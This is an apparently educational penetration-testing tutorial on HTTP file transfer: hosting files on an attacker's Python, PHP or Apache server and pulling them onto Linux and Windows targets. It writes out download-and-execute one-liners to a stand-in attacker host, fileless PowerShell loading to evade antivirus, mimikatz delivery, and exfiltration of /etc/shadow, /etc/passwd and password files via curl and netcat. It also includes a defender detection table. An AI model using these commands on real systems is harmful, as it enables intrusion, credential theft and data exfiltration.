# 🌐 HTTP File Transfer — The Most Common Method

## 📖 What Is HTTP File Transfer?

HTTP file transfer means using a **web server** to host files, and then **downloading them from the target machine** using tools like `wget`, `curl`, or a browser.

> This is the **#1 most used method** in penetration testing because it's simple, fast, and works on almost every target.

---

## 🧠 How It Works (Simple Diagram)

```text
  ATTACKER (Kali)                              TARGET (Victim)
  ┌──────────────┐                             ┌──────────────┐
  │              │                             │              │
  │  Files:      │                             │  Needs:      │
  │  linpeas.sh  │    HTTP Request (GET)       │  linpeas.sh  │
  │  mimikatz.exe│ ◀─────────────────────────  │              │
  │  exploit.py  │                             │  Uses:       │
  │              │    HTTP Response (File)      │  wget        │
  │  Python HTTP │ ──────────────────────────▶ │  curl        │
  │  Server      │                             │  browser     │
  │  Port 80/8000│                             │              │
  └──────────────┘                             └──────────────┘
   
   Step 1: Attacker starts HTTP server
   Step 2: Target downloads files from attacker's server
```

---

## 🐍 Starting an HTTP Server (Attacker Side)

---

### Method 1: Python 3 HTTP Server (Most Common)

```bash
# Start server in current directory on port 8000
python3 -m http.server 8000

# Start on specific port
python3 -m http.server 80

# Start on specific port and bind to all interfaces
python3 -m http.server 80 --bind 0.0.0.0
```

**What happens:**

```text
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

# When target downloads a file, you see:
10.0.0.5 - - [22/Feb/2026 12:00:00] "GET /linpeas.sh HTTP/1.1" 200 -
```

> Whatever files are in the directory where you run this command will be available for download.

---

### Method 2: Python 3 with Upload Support

```bash
# Install uploadserver module
pip install uploadserver

# Start server that allows both download AND upload
python3 -m uploadserver 80
```

Now the target can also **upload files to you**.

---

### Method 3: PHP Server

```bash
php -S 0.0.0.0:80
```

---

### Method 4: Apache (Kali Built-in)

```bash
# Start Apache
sudo systemctl start apache2

# Copy files to web root
sudo cp linpeas.sh /var/www/html/
sudo cp mimikatz.exe /var/www/html/

# Files are now at http://ATTACKER_IP/linpeas.sh
```

---

## 📥 Downloading Files (Target Side)

---

### On LINUX Target

#### wget (Most Common)

```bash
# Basic download
wget http://ATTACKER_IP:8000/linpeas.sh

# Save with different name
wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lin.sh

# Quiet mode (no output)
wget http://ATTACKER_IP:8000/linpeas.sh -q -O /tmp/lin.sh

# Download and execute directly (no file on disk!)
wget http://ATTACKER_IP:8000/linpeas.sh -O - | bash
```

#### curl

```bash
# Basic download (shows in terminal)
curl http://ATTACKER_IP:8000/linpeas.sh

# Save to file
curl http://ATTACKER_IP:8000/linpeas.sh -o linpeas.sh

# Download and execute directly
curl http://ATTACKER_IP:8000/linpeas.sh | bash

# Silent mode
curl -s http://ATTACKER_IP:8000/linpeas.sh -o linpeas.sh
```

#### Make it executable and run

```bash
# Download
wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh

# Make executable
chmod +x /tmp/linpeas.sh

# Run
/tmp/linpeas.sh
```

---

### On WINDOWS Target

#### PowerShell — Invoke-WebRequest (iwr)

```powershell
# Basic download
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/mimikatz.exe" -OutFile "C:\Temp\mimikatz.exe"

# Short version
iwr http://ATTACKER_IP:8000/mimikatz.exe -o C:\Temp\mimikatz.exe

# Download and execute in memory (fileless — no file on disk!)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/PowerView.ps1')
```

#### PowerShell — WebClient

```powershell
# Download file
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8000/nc.exe', 'C:\Temp\nc.exe')

# Download string (for scripts)
(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/script.ps1')
```

#### Certutil (Built-in Windows tool)

```cmd
certutil -urlcache -split -f http://ATTACKER_IP:8000/mimikatz.exe C:\Temp\mimikatz.exe
```

#### Bitsadmin

```cmd
bitsadmin /transfer myJob /download /priority high http://ATTACKER_IP:8000/file.exe C:\Temp\file.exe
```

---

## 📤 Uploading Files FROM Target TO Attacker

Sometimes you need to **send files back** (exfiltrate data).

---

### Method 1: Python Upload Server (Attacker)

**Attacker — Start upload server:**

```bash
pip install uploadserver
python3 -m uploadserver 80
```

**Target (Linux) — Upload file:**

```bash
curl -X POST http://ATTACKER_IP/upload -F 'files=@/etc/shadow'
curl -X POST http://ATTACKER_IP/upload -F 'files=@/tmp/loot.txt'
```

**Target (Windows) — Upload file:**

```powershell
$body = Get-Content C:\Temp\passwords.txt
Invoke-WebRequest -Uri http://ATTACKER_IP/upload -Method POST -Body $body
```

---

### Method 2: Simple Netcat Receive (Attacker)

**Attacker — Listen for incoming file:**

```bash
nc -nlvp 9001 > received_file.txt
```

**Target — Send file:**

```bash
cat /etc/passwd | nc ATTACKER_IP 9001
```

---

## 🔥 Realistic Scenarios

---

### Scenario 1: Upload LinPEAS to Linux Target

```text
SITUATION: You have shell on Linux target, need to enumerate for privilege escalation.

ATTACKER (Kali):
┌──────────────────────────────────────────┐
│ cd /opt/tools                            │
│ python3 -m http.server 80               │
│ Serving HTTP on 0.0.0.0 port 80...      │
└──────────────────────────────────────────┘

TARGET (Linux victim):
┌──────────────────────────────────────────┐
│ wget http://10.10.14.5/linpeas.sh        │
│ chmod +x linpeas.sh                      │
│ ./linpeas.sh                             │
└──────────────────────────────────────────┘
```

---

### Scenario 2: Upload Mimikatz to Windows Target

```text
SITUATION: You have shell on Windows target, need to dump credentials.

ATTACKER (Kali):
┌──────────────────────────────────────────┐
│ cd /opt/tools/mimikatz                   │
│ python3 -m http.server 8000             │
└──────────────────────────────────────────┘

TARGET (Windows — PowerShell):
┌──────────────────────────────────────────┐
│ iwr http://10.10.14.5:8000/mimikatz.exe  │
│     -o C:\Temp\mimi.exe                  │
│ C:\Temp\mimi.exe                         │
└──────────────────────────────────────────┘
```

---

### Scenario 3: Fileless Execution (No File Written to Disk)

```text
SITUATION: Antivirus is watching the disk. You download and run IN MEMORY.

TARGET (Windows — PowerShell):
┌──────────────────────────────────────────────────────────────────┐
│ IEX (New-Object Net.WebClient).DownloadString(                   │
│   'http://10.10.14.5:8000/PowerView.ps1')                       │
│                                                                  │
│ # PowerView is now loaded in memory — no file on disk!           │
│ Get-DomainUser                                                   │
└──────────────────────────────────────────────────────────────────┘

TARGET (Linux):
┌──────────────────────────────────────────────────────────────────┐
│ curl http://10.10.14.5:8000/linpeas.sh | bash                    │
│                                                                  │
│ # linpeas runs directly from memory — no file on disk!           │
└──────────────────────────────────────────────────────────────────┘
```

---

## 🛡 Blue Team — How to Detect HTTP Transfers

| Indicator | What to Monitor |
| --- | --- |
| Unusual outbound HTTP | Connections to unknown IPs on port 80/8000 |
| PowerShell downloading | Script block logging — `Invoke-WebRequest`, `DownloadString` |
| Certutil abuse | Process monitoring — `certutil -urlcache` |
| Large downloads | Network flow analysis |
| Python HTTP server | Unusual processes — `python -m http.server` |

---

## 📊 HTTP Methods Quick Reference

| Method | Command | Platform |
| --- | --- | --- |
| wget | `wget http://IP/file` | Linux |
| curl | `curl http://IP/file -o file` | Linux/Windows |
| PowerShell IWR | `iwr http://IP/file -o file` | Windows |
| WebClient | `(New-Object Net.WebClient).DownloadFile()` | Windows |
| Certutil | `certutil -urlcache -split -f http://IP/file file` | Windows |
| Bitsadmin | `bitsadmin /transfer job /download http://IP/file file` | Windows |
| Fileless (PS) | `IEX (New-Object Net.WebClient).DownloadString()` | Windows |
| Fileless (Linux) | `curl http://IP/file \| bash` | Linux |

---

## ⚠ Ethical Reminder

* ✅ Only use these techniques on systems you have **written authorization** to test
* ✅ Practice in your own lab
* ❌ Never exfiltrate real data without permission
